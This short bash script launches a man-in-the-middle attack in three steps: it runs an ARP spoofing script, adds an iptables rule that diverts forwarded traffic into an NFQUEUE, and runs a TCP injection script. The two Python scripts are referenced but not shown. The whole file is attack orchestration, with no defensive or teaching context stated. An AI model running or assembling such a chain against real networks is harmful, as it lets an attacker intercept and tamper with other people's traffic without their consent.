#!/bin/env bash

echo 'do spoofing'
python3 /src/arp.py

echo 'IP TABLES QUEUE'
iptables -I FORWARD -j NFQUEUE --queue-num 0

echo 'Inject TCP'
python3 /src/tcp_inject.py
